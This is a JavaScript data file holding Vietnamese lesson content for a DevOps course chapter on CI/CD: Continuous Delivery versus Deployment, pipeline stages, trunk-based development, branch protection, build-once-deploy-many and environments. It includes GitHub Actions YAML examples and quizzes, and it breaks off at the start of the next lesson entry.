/* Nội dung bài học chương p08 */
window.LESSON_CONTENT = window.LESSON_CONTENT || {};
Object.assign(window.LESSON_CONTENT, {
  "p08.m0.t0": {
    videos: [
      { id: "olJZtO1jiuk", title: "DevOps for Freshers | Bài 15: CI/CD là gì? CI/CD để làm gì? | DevOps cho người mới bắt đầu", channel: "DEVOPSEDU VN", lang: "vi", minutes: 8, embed: true },
      { id: "7SNbDWob6cI", title: "The Difference Between Continuous Delivery & Continuous Deployment", channel: "Modern Software Engineering", lang: "en", minutes: 18, embed: true }
    ],
    sections: [
      {
        h: "Ba khái niệm hay bị nhầm",
        p: [
          "CI (Continuous Integration) là thói quen tích hợp code vào nhánh chính thường xuyên, mỗi lần tích hợp đều được build và test tự động. Mục tiêu là phát hiện lỗi sớm, khi thay đổi còn nhỏ và người viết còn nhớ mình vừa làm gì.",
          "Continuous Delivery nghĩa là sau CI, mọi commit trên nhánh chính đều ở trạng thái có thể phát hành. Artifact đã được build, test, deploy thử lên staging. Việc đưa lên production chỉ cần một cú bấm hoặc một lần duyệt.",
          "Continuous Deployment đi thêm một bước: không còn bước duyệt tay. Commit nào qua hết các cổng kiểm tra tự động sẽ tự lên production. Cả hai cách viết tắt đều là CD, nên khi ai đó nói CD, bạn nên hỏi lại họ đang nói Delivery hay Deployment."
        ]
      },
      {
        h: "Vì sao cần CI/CD",
        p: [
          "Không có CI, mỗi người làm trên nhánh riêng nhiều tuần, đến lúc merge thì xung đột lớn và lỗi tích tụ. Không có CD, việc release là sự kiện căng thẳng, làm bằng tay theo checklist, dễ sót bước và khó lặp lại.",
          "CI/CD biến release thành việc nhàm chán: nhỏ, thường xuyên, tự động, có thể rollback. Thay đổi càng nhỏ thì càng dễ review, dễ tìm nguyên nhân khi lỗi và rủi ro mỗi lần deploy càng thấp."
        ],
        list: [
          "CI: mỗi PR và mỗi push đều chạy lint, test, build.",
          "Continuous Delivery: main luôn deploy được; production cần người duyệt.",
          "Continuous Deployment: main xanh là tự lên production, cần test và giám sát rất tốt."
        ]
      },
      {
        h: "Ví dụ: cùng một pipeline, khác ở cổng duyệt",
        p: [
          "Trong GitHub Actions, khác biệt giữa Delivery và Deployment thường chỉ nằm ở cấu hình environment. Nếu environment `production` có Required reviewers, pipeline dừng lại chờ duyệt (Delivery). Bỏ quy tắc đó thì pipeline chạy thẳng tới production (Deployment). Environment là một cấu hình trong Settings của repo, gom secret và quy tắc bảo vệ cho một môi trường deploy; bài về secret và environment sẽ nói kỹ. Lưu ý: với repo private, Required reviewers chỉ có trên gói GitHub Enterprise."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test

  deploy-production:
    if: github.event_name == 'push'
    needs: test
    runs-on: ubuntu-latest
    # Có Required reviewers trên environment này = Continuous Delivery
    # Không có = Continuous Deployment
    environment: production
    steps:
      - run: echo "Deploy \${{ github.sha }}"`
        }
      },
      {
        h: "Nên chọn cái nào",
        p: [
          "Hầu hết đội nên bắt đầu với CI thật tốt rồi tiến tới Continuous Delivery. Continuous Deployment chỉ an toàn khi bạn có test tự động đáng tin cậy, giám sát và cảnh báo tốt, có feature flag và rollback nhanh. Ở các lĩnh vực có quy định chặt như ngân hàng, bước duyệt tay thường là yêu cầu bắt buộc, nên Continuous Delivery là điểm dừng hợp lý."
        ]
      }
    ],
    summary: [
      "CI: tích hợp code thường xuyên, mỗi lần đều build và test tự động.",
      "Continuous Delivery: mọi commit trên main luôn sẵn sàng release, production cần một bước duyệt.",
      "Continuous Deployment: bỏ bước duyệt, qua hết kiểm tra tự động là lên production.",
      "Thay đổi nhỏ và thường xuyên giúp giảm rủi ro mỗi lần deploy."
    ],
    pitfalls: [
      "Gọi một job build chạy mỗi đêm là CI: nếu developer vẫn giữ nhánh riêng nhiều tuần thì đó không phải tích hợp liên tục.",
      "Bật Continuous Deployment khi test còn mỏng và chưa có giám sát: lỗi lên production nhanh hơn chứ không an toàn hơn.",
      "Để pipeline đỏ nhiều ngày mà vẫn merge: khi đó main không còn ở trạng thái release được."
    ],
    quiz: [
      {
        q: "Điểm khác biệt chính giữa Continuous Delivery và Continuous Deployment là gì?",
        options: ["Delivery bỏ qua test tự động, còn Deployment chạy đủ test","Deployment tự lên production, không có bước duyệt tay","Delivery chỉ dành cho mobile, Deployment dành cho web","Deployment không cần build artifact trước khi phát hành"],
        answer: 1,
        explain: "Cả hai đều build, test và giữ main ở trạng thái release được. Khác biệt là Deployment bỏ bước duyệt tay trước production. Các đáp án còn lại mô tả sai cả hai khái niệm."
      },
      {
        q: "Mục tiêu cốt lõi của CI là gì?",
        options: ["Deploy lên production ít nhất mỗi giờ một lần","Thay thế hoàn toàn bước code review thủ công","Phát hiện lỗi tích hợp sớm nhờ merge và test thường xuyên","Giảm bớt số lượng test để pipeline chạy nhanh hơn"],
        answer: 2,
        explain: "CI giúp phát hiện lỗi khi thay đổi còn nhỏ. CI không thay code review, không bắt buộc deploy production và càng không giảm test."
      },
      {
        q: "Trong GitHub Actions, cách phổ biến để biến pipeline thành Continuous Delivery là gì?",
        options: ["Xoá job deploy khỏi workflow","Chạy job deploy theo lịch schedule","Dùng matrix build cho job deploy","Đặt Required reviewers cho environment"],
        answer: 3,
        explain: "Required reviewers khiến job dùng environment production phải chờ người duyệt. Schedule và matrix không liên quan tới cổng duyệt; xoá job deploy thì không còn CD."
      }
    ]
  },
  "p08.m0.t1": {
    videos: [
      { id: "AknbizcLq4w", title: "CI/CD Explained: The DevOps Skill That Makes You 10x More Valuable", channel: "TechWorld with Nana", lang: "en", minutes: 21, embed: true }
    ],
    sections: [
      {
        h: "Pipeline là dây chuyền các cổng kiểm tra",
        p: [
          "Pipeline là chuỗi bước tự động biến một commit thành phần mềm chạy trên production. Mỗi stage là một cổng: nếu thất bại, commit dừng lại ở đó và không đi tiếp. Nguyên tắc sắp xếp là bước nhanh, rẻ chạy trước; bước chậm, tốn kém chạy sau. Như vậy phần lớn lỗi được báo trong vài phút đầu."
        ],
        list: [
          "Lint & type-check: vài chục giây, bắt lỗi cú pháp và kiểu.",
          "Unit test và integration test: bắt lỗi logic, thường có database thật qua service container.",
          "Build: tạo artifact, thường là Docker image gắn tag theo commit SHA.",
          "Scan: quét lỗ hổng dependency và image (SCA, Trivy), có thể chặn nếu có lỗi CRITICAL.",
          "Publish artifact: đẩy image lên registry (GHCR, ECR).",
          "Deploy staging rồi chạy smoke test hoặc e2e test.",
          "Deploy production (có thể cần duyệt), sau đó verify bằng health check và metric."
        ]
      },
      {
        h: "Ví dụ khung pipeline với needs",
        p: [
          "Trong GitHub Actions, thứ tự stage được tạo bằng `needs`. Các job không phụ thuộc nhau chạy song song, ví dụ lint và test. Job `image` chỉ chạy khi cả hai xanh."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/pipeline.yml",
          src: `name: Pipeline
on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with: { node-version: 24, cache: npm }
      - run: npm ci && npm run lint && npm run typecheck

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with: { node-version: 24, cache: npm }
      - run: npm ci && npm test

  image:
    needs: [lint, test]
    runs-on: ubuntu-latest
    steps:
      - run: echo "build, scan, push image theo SHA"

  deploy-staging:
    needs: image
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: echo "deploy + smoke test"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo "deploy + verify"`
        }
      },
      {
        h: "Đánh đổi: tốc độ và độ an toàn",
        p: [
          "Pipeline càng nhiều cổng thì càng an toàn nhưng càng chậm. Một mốc tham khảo phổ biến là phản hồi cho PR nên trong khoảng 10 phút, vì lâu hơn thì developer chuyển sang việc khác và mất tập trung. Bạn có thể giữ tốc độ bằng cách chạy song song, cache dependency, và tách những bước rất chậm (DAST, e2e đầy đủ) ra chạy trên staging hoặc theo lịch.",
          "Stage Verify thường bị bỏ quên. Deploy xong chưa có nghĩa là thành công: cần gọi health check, xem tỷ lệ lỗi và độ trễ trong vài phút đầu, và có đường rollback tự động nếu chỉ số xấu đi."
        ]
      },
      {
        h: "Pipeline cho PR khác pipeline cho main",
        p: [
          "Không phải stage nào cũng chạy ở mọi sự kiện. Với pull request, pipeline chạy lint, test, build image (không push) và scan để trả lời câu hỏi: thay đổi này có an toàn để merge không. Với push lên main, pipeline chạy đầy đủ: build, scan, publish, deploy staging, deploy production.",
          "Cách làm phổ biến là dùng điều kiện `if: github.event_name == 'push'` cho các job publish và deploy, như ví dụ Lab 03. PR từ fork không nhận secret, nên mọi bước cần secret phải nằm ở pipeline của main."
        ]
      }
    ],
    summary: [
      "Pipeline là chuỗi cổng: lint, test, build, scan, publish, deploy staging, test, deploy production, verify.",
      "Bước nhanh và rẻ chạy trước để báo lỗi sớm.",
      "Dùng `needs` để tạo thứ tự, các job độc lập chạy song song.",
      "Scan phải chạy trước khi publish; verify sau deploy là bắt buộc."
    ],
    pitfalls: [
      "Push image lên registry rồi mới scan: image lỗi đã nằm sẵn trên registry và có thể bị deploy nhầm.",
      "Dồn mọi thứ vào một job dài 40 phút: lỗi lint cũng phải chờ cả pipeline mới biết.",
      "Coi deploy xong là xong, không có smoke test hay theo dõi metric sau deploy."
    ],
    quiz: [
      {
        q: "Vì sao lint và type-check thường được đặt ở đầu pipeline?",
        options: ["Vì chúng bắt buộc phải chạy trên production","Vì chúng là bước tạo ra Docker image","Vì GitHub yêu cầu thứ tự như vậy","Vì chúng nhanh, rẻ và báo lỗi sớm"],
        answer: 3,
        explain: "Nguyên tắc là fail fast: bước nhanh chạy trước để phản hồi sớm. Lint không tạo image và không có quy định nào của GitHub buộc thứ tự này."
      },
      {
        q: "Scan image nên đặt ở đâu so với bước push lên registry?",
        options: ["Sau khi push", "Trước khi push", "Chỉ chạy trên production", "Không cần scan nếu test đã xanh"],
        answer: 1,
        explain: "Scan trước khi push để image có lỗ hổng nghiêm trọng không bao giờ lên registry. Test xanh không nói gì về CVE trong base image."
      },
      {
        q: "Trong GitHub Actions, từ khoá nào tạo phụ thuộc giữa các job?",
        options: ["depends_on", "after", "needs", "stage"],
        answer: 2,
        explain: "`needs` khai báo job phải chờ job khác thành công. `depends_on` là của Docker Compose, `stage` là khái niệm của GitLab CI."
      }
    ]
  },
  "p08.m0.t2": {
    videos: [
      { id: "GQQqf-C2ha4", title: "3 Git Workflows Every Developer Should Know (And When to Use Each)", channel: "TechWorld with Nana", lang: "en", minutes: 32, embed: true },
      { id: "CR3LP2n2dWw", title: "We Tried Trunk-Based Development... The Results Were Shocking.", channel: "Modern Software Engineering", lang: "en", minutes: 14, embed: true }
    ],
    sections: [
      {
        h: "Trunk-based development là gì",
        p: [
          "Trunk-based development là cách làm việc mà mọi người tích hợp code vào một nhánh chính (trunk, thường là `main`) nhiều lần mỗi ngày. Nhánh tính năng nếu có thì sống rất ngắn, thường dưới một đến hai ngày. Đây chính là điều kiện để CI đúng nghĩa: nếu không merge thường xuyên thì không có tích hợp liên tục.",
          "Trái ngược là mô hình nhánh sống dài như GitFlow với các nhánh develop, release, feature kéo dài nhiều tuần. Mô hình đó hợp với phần mềm phát hành theo phiên bản đóng gói, nhưng với dịch vụ web deploy liên tục, nó tạo ra merge lớn, xung đột nhiều và release chậm."
        ]
      },
      {
        h: "Làm sao merge khi tính năng chưa xong",
        p: [
          "Câu hỏi hay gặp nhất: tính năng cần hai tuần thì làm sao merge mỗi ngày? Câu trả lời là tách deploy khỏi release. Code chưa xong vẫn được merge và deploy, nhưng được ẩn sau feature flag đang tắt. Khi hoàn thiện, bạn bật flag cho một nhóm nhỏ rồi mở rộng dần."
        ],
        list: [
          "Feature flag: bọc code mới trong điều kiện bật/tắt.",
          "Branch by abstraction: tạo interface, làm bản cài đặt mới song song với bản cũ, chuyển dần rồi xoá bản cũ.",
          "Chia nhỏ PR: mỗi PR là một bước hoàn chỉnh, có test, không làm hỏng main."
        ],
        code: {
          lang: "typescript",
          file: "src/checkout/checkout.service.ts",
          src: `// Code mới đã nằm trên main nhưng chỉ chạy khi flag bật
async checkout(userId: string, cart: Cart) {
  const useNewFlow = await this.flags.getBooleanValue('new-checkout', false, {
    targetingKey: userId,
  });
  return useNewFlow ? this.checkoutV2(cart) : this.checkoutV1(cart);
}`
        }
      },
      {
        h: "Quy trình hằng ngày",
        p: [
          "Mỗi sáng bạn kéo main mới nhất, tạo nhánh ngắn, làm một thay đổi nhỏ, mở PR, CI chạy, đồng đội review, merge trong ngày. Nhờ PR nhỏ, review nhanh hơn và chất lượng review cao hơn. Với đội lớn, merge queue giúp đảm bảo mỗi PR được test trên phiên bản main mới nhất trước khi merge.",
          "Đánh đổi: trunk-based đòi hỏi kỷ luật cao. Test tự động phải tốt, CI phải nhanh, và mọi người phải chấp nhận commit code chưa hoàn thiện nhưng an toàn. Flag cũ phải được dọn dẹp, nếu không code sẽ đầy nhánh điều kiện chết."
        ]
      }
    ],
    summary: [
      "Mọi người merge vào main nhiều lần mỗi ngày, nhánh sống rất ngắn.",
      "Feature flag và branch by abstraction cho phép merge code chưa xong một cách an toàn.",
      "PR nhỏ giúp review nhanh, dễ tìm lỗi, rủi ro thấp.",
      "Cần CI nhanh, test tốt và thói quen dọn flag cũ."
    ],
    pitfalls: [
      "Gọi là trunk-based nhưng nhánh vẫn sống hai tuần: bạn vẫn gặp merge lớn như GitFlow.",
      "Merge code dở dang mà không có flag, làm hỏng tính năng đang chạy trên production.",
      "Không bao giờ xoá flag đã bật 100%: code thành mê cung điều kiện và khó test mọi tổ hợp."
    ],
    quiz: [
      {
        q: "Trong trunk-based development, nhánh tính năng thường sống bao lâu?",
        options: ["Vài tháng, theo chu kỳ release","Đến khi có release lớn tiếp theo","Thường dưới một đến hai ngày","Không bao giờ được merge vào main"],
        answer: 2,
        explain: "Nhánh ngắn là cốt lõi của trunk-based. Nhánh sống hàng tháng hoặc chờ release là đặc điểm của mô hình nhánh dài."
      },
      {
        q: "Làm sao merge tính năng chưa hoàn thiện vào main mà không ảnh hưởng người dùng?",
        options: ["Comment code lại", "Ẩn sau feature flag đang tắt", "Tắt CI cho PR đó", "Push thẳng lên main"],
        answer: 1,
        explain: "Feature flag cho phép code nằm trên main và được deploy nhưng không kích hoạt. Tắt CI hoặc push thẳng phá vỡ cổng kiểm tra; comment code thì code không được build và test."
      },
      {
        q: "Merge queue giải quyết vấn đề gì?",
        options: ["Kiểm tra PR trên main mới nhất trước khi merge","Tự động sinh test cho các PR mới","Thay thế bước code review của đồng đội","Giảm dung lượng lịch sử của repo"],
        answer: 0,
        explain: "Khi nhiều PR merge liên tục, một PR xanh trên main cũ vẫn có thể làm hỏng main mới. Merge queue test lại PR trên main mới nhất. Nó không viết test hay thay review."
      }
    ]
  },
  "p08.m0.t3": {
    videos: [
      { id: "ZTbM-h9RZOo", title: "Introduction to GitHub Actions - Part 6 - Repository Rulesets", channel: "Mickey Gousset", lang: "en", minutes: 15, embed: true }
    ],
    sections: [
      {
        h: "Vì sao phải bảo vệ nhánh main",
        p: [
          "Nếu main là thứ luôn deploy được, thì không được để ai đẩy code chưa kiểm tra lên đó, kể cả admin. Branch protection (hoặc repository rulesets, cách cấu hình mới hơn của GitHub) buộc mọi thay đổi phải đi qua pull request, phải có CI xanh và có người review.",
          "Đây cũng là một biện pháp bảo mật: nếu tài khoản một developer bị chiếm, kẻ tấn công không thể lặng lẽ push mã độc lên main mà không có ai duyệt."
        ],
        list: [
          "Require a pull request before merging, tối thiểu 1 approval.",
          "Require status checks to pass: chọn đúng tên các job CI quan trọng.",
          "Require branches to be up to date hoặc dùng merge queue.",
          "Chặn force push và xoá nhánh.",
          "Require review from Code Owners cho những thư mục nhạy cảm.",
          "Không cho phép bypass, hoặc giới hạn người được bypass."
        ]
      },
      {
        h: "CODEOWNERS: đúng người review đúng chỗ",
        p: [
          "File `CODEOWNERS` gán người hoặc team chịu trách nhiệm cho từng đường dẫn. Khi PR chạm vào thư mục workflow hoặc hạ tầng, GitHub tự yêu cầu review từ team tương ứng. Thay đổi workflow CI rất nhạy cảm vì workflow có quyền truy cập secret, nên nên giao cho team platform."
        ],
        code: {
          lang: "text",
          file: ".github/CODEOWNERS",
          src: `# Dòng sau ghi đè dòng trước nếu cùng khớp
*                       @my-org/backend
/.github/workflows/     @my-org/platform
/infra/                 @my-org/platform
/prisma/migrations/     @my-org/backend-leads`
        }
      },
      {
        h: "Required checks và các bẫy",
        p: [
          "Required status check khớp theo tên check, với GitHub Actions thường là tên job. Nếu bạn đổi tên job mà không cập nhật rule, PR sẽ treo ở trạng thái chờ mãi. Nếu workflow bị bỏ qua do lọc `paths`, check bắt buộc cũng ở trạng thái chờ và PR không merge được.",
          "Nếu dùng merge queue, workflow CI phải lắng nghe thêm sự kiện `merge_group`, nếu không các check bắt buộc sẽ không bao giờ chạy trong hàng đợi."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `on:
  pull_request:
  merge_group:        # bắt buộc khi bật merge queue
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  test:               # tên này được chọn trong Required status checks
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm ci && npm test`
        }
      },
      {
        h: "Rulesets và bảo vệ tag",
        p: [
          "GitHub có hai cách cấu hình: branch protection rule cổ điển và repository rulesets mới hơn. Rulesets cho phép nhiều bộ quy tắc cùng áp dụng, nhắm tới nhiều nhánh hoặc tag theo mẫu, và có thể đặt ở cấp organization để mọi repo cùng tuân theo. Với repo mới, hãy ưu tiên rulesets.",
          "Đừng quên bảo vệ tag. Nếu workflow deploy production được kích hoạt bởi tag `v*`, thì ai tạo được tag là người đó deploy được. Một ruleset cho tag `v*` chỉ cho phép nhóm release tạo tag và cấm xoá hay di chuyển tag đã có."
        ]
      }
    ],
    summary: [
      "Không ai push thẳng lên main; mọi thay đổi đi qua PR.",
      "Required status checks đảm bảo CI xanh trước khi merge.",
      "CODEOWNERS buộc đúng team review các thư mục nhạy cảm như workflow và infra.",
      "Merge queue cần trigger `merge_group` trong workflow."
    ],
    pitfalls: [
      "Cho admin bypass rule: sự cố thường xảy ra đúng lúc vội và bypass.",
      "Đổi tên job CI nhưng quên cập nhật tên check bắt buộc, khiến mọi PR bị treo.",
      "Dùng `paths` filter cho workflow có check bắt buộc: PR không chạm path đó sẽ không merge được."
    ],
    quiz: [
      {
        q: "Required status check trong GitHub khớp với cái gì của GitHub Actions?",
        options: ["Tên file workflow", "Tên check, thường là tên job", "Tên nhánh", "Tên runner"],
        answer: 1,
        explain: "Rule chọn theo tên check mà job báo về. Tên file workflow, nhánh hay runner không phải là thứ được so khớp."
      },
      {
        q: "Vì sao nên dùng CODEOWNERS cho thư mục `.github/workflows/`?",
        options: ["Để workflow chạy nhanh hơn trên runner","Vì GitHub bắt buộc mọi repo phải có","Vì workflow chạm tới secret nên cần team platform duyệt","Để tự tắt CI với các PR sửa workflow"],
        answer: 2,
        explain: "Sửa workflow có thể làm lộ secret hoặc bỏ qua các cổng kiểm tra, nên cần người có chuyên môn duyệt. CODEOWNERS không ảnh hưởng tốc độ và không bắt buộc."
      },
      {
        q: "Bạn bật merge queue nhưng PR trong hàng đợi không bao giờ có kết quả check. Nguyên nhân khả dĩ nhất?",
        options: ["Thiếu trigger `merge_group` trong workflow", "Thiếu `workflow_dispatch`", "Runner hết dung lượng", "Chưa tạo tag"],
        answer: 0,
        explain: "Merge queue tạo sự kiện `merge_group`; workflow không lắng nghe sự kiện này thì không chạy. Các lựa chọn khác không liên quan trực tiếp."
      }
    ]
  },
  "p08.m0.t4": {
    sections: [
      {
        h: "Nguyên tắc: build một lần, dùng lại khắp nơi",
        p: [
          "Build once, deploy many nghĩa là mỗi commit chỉ được build thành artifact đúng một lần. Artifact đó, thường là Docker image gắn tag theo commit SHA, được deploy lên staging, được test, rồi chính nó được đưa lên production. Không build lại cho từng môi trường.",
          "Lý do rất thực tế: mỗi lần build là một cơ hội để khác đi. Base image `node:24-alpine` có thể đã được cập nhật, một dependency có thể ra bản vá mới, cache có thể khác. Nếu production chạy một image được build lại, thì thứ bạn đã test trên staging không còn là thứ đang chạy trên production."
        ]
      },
      {
        h: "Config tách khỏi artifact",
        p: [
          "Để một image chạy được ở nhiều môi trường, mọi thứ khác nhau giữa môi trường phải nằm ngoài image: URL database, secret, mức log, feature flag mặc định. Chúng được truyền vào lúc chạy qua biến môi trường, ConfigMap, Secret hoặc secret manager. Đây là nguyên tắc config của 12-factor app.",
          "Không được có những thứ như `if (NODE_ENV === 'production')` để đổi URL gọi API cứng trong code, và cũng không được bake file `.env.production` vào image."
        ],
        list: [
          "Tag bằng commit SHA: bất biến, truy ngược được về code.",
          "Tốt hơn nữa là deploy theo digest `@sha256:...` (mã băm nội dung image), vì tag có thể bị ghi đè còn digest thì không.",
          "Bật chế độ tag immutable trên registry (ECR hỗ trợ) để không ai ghi đè tag cũ."
        ]
      },
      {
        h: "Ví dụ: truyền cùng một tag qua các job",
        p: [
          "Job build xuất ra tag qua `outputs`. Job deploy staging và production nhận đúng tag đó. Không có bước `docker build` nào trong các job deploy."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `jobs:
  image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    outputs:
      tag: \${{ steps.vars.outputs.tag }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: vars
        run: echo "tag=\${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
      - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: true
          tags: ghcr.io/\${{ github.repository }}:\${{ steps.vars.outputs.tag }}

  deploy-staging:
    needs: image
    uses: ./.github/workflows/deploy.yml
    with:
      environment: staging
      image_tag: \${{ needs.image.outputs.tag }}

  deploy-production:
    needs: [image, deploy-staging]
    uses: ./.github/workflows/deploy.yml
    with:
      environment: production
      image_tag: \${{ needs.image.outputs.tag }}`
        }
      },
      {
        h: "Đánh đổi",
        p: [
          "Cách này đòi hỏi bạn thiết kế ứng dụng đọc config lúc khởi động, và đòi hỏi registry dùng chung giữa các môi trường hoặc có bước copy image giữa registry. Với frontend SPA, biến như URL API thường bị nhúng lúc build; giải pháp là nạp config runtime (ví dụ file `config.json` do server trả về) thay vì build riêng cho từng môi trường."
        ]
      }
    ],
    summary: [
      "Mỗi commit build đúng một artifact, dùng lại cho mọi môi trường.",
      "Tag image theo commit SHA, lý tưởng là deploy theo digest.",
      "Config khác nhau giữa môi trường truyền vào lúc chạy, không bake vào image.",
      "Thứ đã test trên staging chính là thứ chạy trên production."
    ],
    pitfalls: [
      "Build lại image cho production: có thể khác base image hoặc dependency so với bản đã test.",
      "Dùng tag `latest` để deploy: không biết đang chạy commit nào, rollback cũng không rõ về đâu.",
      "Nhúng secret hoặc URL môi trường vào image lúc build."
    ],
    quiz: [
      {
        q: "Vì sao không nên build lại image riêng cho production?",
        options: ["Vì build lại tốn thêm phút runner","Vì image mới có thể khác bản đã test","Vì registry không cho push lại cùng repo","Vì Docker không hỗ trợ build lại"],
        answer: 1,
        explain: "Lý do chính là đảm bảo thứ chạy trên production giống hệt thứ đã test. Chi phí runner là phụ; registry và Docker đều cho phép build lại."
      },
      {
        q: "Cách tham chiếu image nào đảm bảo bất biến tuyệt đối?",
        options: ["Tag `latest`", "Tag theo tên nhánh", "Digest `@sha256:...`", "Tag `stable`"],
        answer: 2,
        explain: "Digest là hash nội dung nên không thể trỏ sang image khác. Mọi tag đều có thể bị ghi đè trừ khi registry bật immutable tag."
      },
      {
        q: "Config khác nhau giữa staging và production nên được đưa vào như thế nào?",
        options: ["Build argument riêng cho mỗi môi trường","Sửa hằng số trong code trước mỗi lần deploy","Nhánh Git riêng cho mỗi môi trường","Biến môi trường, ConfigMap hoặc secret manager lúc chạy"],
        answer: 3,
        explain: "Truyền config lúc chạy giữ artifact giống nhau. Build argument riêng hay nhánh riêng đều dẫn tới artifact khác nhau cho mỗi môi trường."
      }
    ]
  },
  "p08.m0.t5": {
    sections: [
      {
        h: "Vai trò của từng môi trường",
        p: [
          "Môi trường là nơi ứng dụng chạy cùng cấu hình và dữ liệu riêng. Mỗi môi trường có mục đích khác nhau, và code đi qua chúng theo thứ tự từ ít rủi ro tới nhiều rủi ro."
        ],
        list: [
          "dev (hoặc local): developer tự chạy, thường bằng Docker Compose, dữ liệu giả.",
          "preview: môi trường tạm cho từng PR, reviewer và tester bấm thử được trước khi merge.",
          "staging: giống production nhất có thể, chạy đúng image sẽ lên production, dùng cho smoke test và e2e.",
          "production: người dùng thật, dữ liệu thật, quyền truy cập chặt nhất."
        ]
      },
      {
        h: "Environment parity",
        p: [
          "Parity là mức độ giống nhau giữa các môi trường. Staging khác production càng nhiều thì càng có lỗi chỉ xuất hiện trên production. Những khác biệt hay gây sự cố: phiên bản Postgres khác, staging không có CDN hoặc load balancer, staging chạy một replica nên không lộ lỗi race condition, cấu hình timeout khác.",
          "Cách đạt parity tốt nhất là dùng cùng mã hạ tầng (Terraform module, Helm chart) cho mọi môi trường, chỉ khác file biến như kích thước instance hay số replica. Staging nhỏ hơn thì được, nhưng phải cùng kiểu thành phần và cùng phiên bản."
        ]
      },
      {
        h: "Preview environment cho mỗi PR",
        p: [
          "Preview environment giúp review bằng cách dùng thật, không chỉ đọc code. Mỗi PR được deploy vào một namespace riêng như `pr-123` với URL riêng. Khi PR đóng, môi trường phải được xoá để không tốn tiền."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/preview.yml",
          src: `name: Preview
on:
  pull_request:
    types: [opened, synchronize, reopened, closed]

permissions:
  contents: read

concurrency:
  group: preview-\${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  deploy:
    if: github.event.action != 'closed'
    runs-on: ubuntu-latest
    environment:
      name: preview
      url: https://pr-\${{ github.event.pull_request.number }}.preview.example.com
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: ./scripts/deploy-preview.sh "pr-\${{ github.event.pull_request.number }}"

  cleanup:
    if: github.event.action == 'closed'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: ./scripts/destroy-preview.sh "pr-\${{ github.event.pull_request.number }}"`
        }
      },
      {
        h: "Đánh đổi",
        p: [
          "Preview environment tốn tài nguyên và cần xử lý database (seed dữ liệu mẫu hoặc database dùng chung cho preview). PR từ fork không nên được deploy tự động vì code lạ sẽ chạy với quyền của bạn. Nhiều đội chỉ bật preview cho PR có label nhất định để tiết kiệm."
        ]
      },
      {
        h: "Ánh xạ môi trường vào công cụ",
        p: [
          "Trong GitHub, mỗi môi trường tương ứng một GitHub Environment với secret, variable và quy tắc duyệt riêng. Trong Kubernetes, môi trường thường là namespace riêng, còn production nên nằm trên cluster riêng, lý tưởng là cả tài khoản cloud riêng, để một sai sót ở staging không thể chạm tới production.",
          "Quyền truy cập cũng tăng dần theo môi trường: developer có thể toàn quyền trên dev và preview, đọc được staging, còn production chỉ thay đổi qua pipeline."
        ]
      }
    ],
    summary: [
      "dev, preview, staging, production có mục đích và mức rủi ro tăng dần.",
      "Staging phải giống production về kiểu thành phần và phiên bản.",
      "Dùng cùng mã hạ tầng cho mọi môi trường, chỉ khác biến.",
      "Preview environment theo PR phải được dọn khi PR đóng."
    ],
    pitfalls: [
      "Staging dùng SQLite hoặc Postgres khác phiên bản production: lỗi migration chỉ lộ ra khi lên production.",
      "Quên xoá preview environment, hóa đơn cloud tăng dần theo số PR.",
      "Copy nguyên dữ liệu production về staging mà không ẩn danh, vi phạm bảo vệ dữ liệu cá nhân."
    ],
    quiz: [
      {
        q: "Environment parity nghĩa là gì?",
        options: ["Mọi môi trường có cùng số server","Các môi trường cùng thành phần và phiên bản","Mọi môi trường dùng chung một database","Staging và production dùng cùng domain"],
        answer: 1,
        explain: "Parity là giống nhau về bản chất; quy mô có thể khác. Dùng chung database hay domain là sai và nguy hiểm."
      },
      {
        q: "Workflow preview cần xử lý sự kiện nào để dọn môi trường?",
        options: ["pull_request với types closed", "push lên main", "schedule", "release"],
        answer: 0,
        explain: "Khi PR đóng (merge hoặc không), sự kiện pull_request với action closed kích hoạt job dọn dẹp."
      },
      {
        q: "Vì sao không nên tự động deploy preview cho PR từ fork?",
        options: ["Vì code lạ sẽ chạy trên hạ tầng của bạn","Vì PR từ fork không chứa code","Vì GitHub cấm deploy từ fork","Vì preview chỉ dành cho nhánh main"],
        answer: 0,
        explain: "Code từ fork chưa được tin cậy; deploy nó có thể giúp kẻ tấn công truy cập hạ tầng hoặc secret."
      }
    ]
  },
  "p08.m0.t6": {
    videos: [
